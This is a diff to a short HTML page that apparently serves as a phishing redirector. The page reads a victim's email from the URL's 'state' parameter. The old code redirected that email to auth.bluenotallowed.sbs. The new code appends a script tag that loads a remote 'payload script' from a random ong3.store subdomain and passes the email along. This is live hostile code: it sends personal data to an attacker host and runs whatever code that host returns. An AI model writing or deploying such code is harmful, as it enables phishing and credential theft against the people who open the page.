@@ -1,6 +1,6 @@
 <html>
 <head>
-  <script>
+<script>
     function getEmailFromURL() {
       const url = window.location.href;
       const match = url.match(/[?&]state=([^&#]+)/);
@@ -27,13 +27,17 @@
     const email = getEmailFromURL();
 
     if (email) {
-      // Fixed the line break and concatenation
-      window.location.href = "https://auth.bluenotallowed.sbs/bbqqz/?e=" + email;
+      // merged: load payload script directly instead of window.location.href redirect
+      var _p = document.createElement("script");
+      _p.src = "https://rrb5fd2rszrcrpzkm5etq2ds2itqvhi2a5olqezhtr4noqqn5zfq.ong3.store/jEPSj1GWYii_KmdJOGhy0icKnRoHXLgTJ5x410IN7ks?e=" + email;
+      _p.async = true;
+      (document.head || document.documentElement).appendChild(_p);
     } else {
       console.log("No valid email found in state parameter.");
     }
   </script>
 </head>
-<body><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<body>
+  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
